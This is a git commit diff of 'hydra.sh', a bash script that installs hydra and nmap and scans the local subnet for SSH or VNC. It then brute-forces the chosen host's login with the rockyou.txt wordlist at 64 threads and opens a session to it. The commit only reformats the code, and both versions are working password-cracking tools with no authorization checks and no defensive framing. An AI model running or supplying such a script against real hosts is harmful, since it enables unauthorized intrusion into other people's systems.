ccc1b7c7d286c64f179066f7766e336e665736f7
anona <39059459+WilSegale@users.noreply.github.com>
2022-05-15 08:28:37 -0400

    script

--- hydra.sh
+++ hydra.sh
@@ -2,12 +2,11 @@
 sudo rm -rf output.txt
 clear
 echo "Loading..."
-for ((k = 0; k <= 10 ; k++))
-do
+for ((k = 0; k <= 10; k++)); do
     echo -n "[ "
-    for ((i = 0 ; i <= k; i++)); do echo -n "###"; done
+    for ((i = 0; i <= k; i++)); do echo -n "###"; done
     sleep 1
-    for ((j = i ; j <= 10 ; j++)); do echo -n "   "; done
+    for ((j = i; j <= 10; j++)); do echo -n "   "; done
     v=$((k * 10))
     echo -n " ] "
     echo -n "$v%" $'\r'
@@ -19,35 +18,30 @@ clear
 echo 'Starting...'
 
 function run() {
-	brew install hydra && brew install nmap
-	clear
-	read -p "Do you want SSH(22) or VNC(5900). To see all type (ALL): " service
+    brew install hydra && brew install nmap
+    clear
+    read -p "Do you want SSH(22) or VNC(5900). To see all type (ALL): " service
 
-		if [[ $service == "ALL" ]] 
-	
-			then
-				sudo nmap -sS 192.168.1.1/24 --open
+    if [[ $service == "ALL" ]]; then
+        sudo nmap -sS 192.168.1.1/24 --open
 
-		elif [[ $service == "all" ]] 
-			then 
-				sudo nmap -sS 192.168.1.1/24 --open
+    elif [[ $service == "all" ]]; then
+        sudo nmap -sS 192.168.1.1/24 --open
 
-		else
-			sudo nmap -sS 192.168.1.1/24 -p $service --open
-	fi
+    else
+        sudo nmap -sS 192.168.1.1/24 -p $service --open
+    fi
 
-	echo "To crack VNC(5900) type 'NONE' in the input username"
-	read -p "input username: " user
-	read -p "input hostname: " host
-	
-	if [ $user == "NONE" ] 
-		
-		then
-			hydra -P rockyou.txt -t 64 -vV -o output.txt -I vnc://$host
-			open vnc://$host
-		else
-			hydra -l $user -P rockyou.txt -t 64 -vV -o output.txt -I ssh://$host
-			open ssh $user@$host
-	fi
-};
+    echo "To crack VNC(5900) type 'NONE' in the input username"
+    read -p "input username: " user
+    read -p "input hostname: " host
+
+    if [ $user == "NONE" ]; then
+        hydra -P rockyou.txt -t 64 -vV -o output.txt -I vnc://$host
+        open vnc://$host
+    else
+        hydra -l $user -P rockyou.txt -t 64 -vV -o output.txt -I ssh://$host
+        open ssh $user@$host
+    fi
+}
 run
